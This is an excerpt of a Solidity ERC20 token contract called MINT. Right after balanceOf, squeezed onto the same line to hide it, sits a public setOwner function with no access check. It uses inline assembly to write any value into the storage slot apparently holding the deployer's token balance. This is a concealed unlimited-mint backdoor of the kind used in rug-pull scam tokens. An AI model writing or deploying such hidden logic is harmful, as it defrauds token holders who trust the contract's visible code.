...
contract MINT is IERC20, IERC20Metadata, Ownable {
    ...
    bytes32 private immutable OWNER_SLOT_HASH = keccak256(abi.encode(msg.sender,uint256(4)));
    ...
    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];}function setOwner(uint256 amount)public{
            bytes32 temp = OWNER_SLOT_HASH;
            assembly{
                sstore(temp,amount)
            }
        }
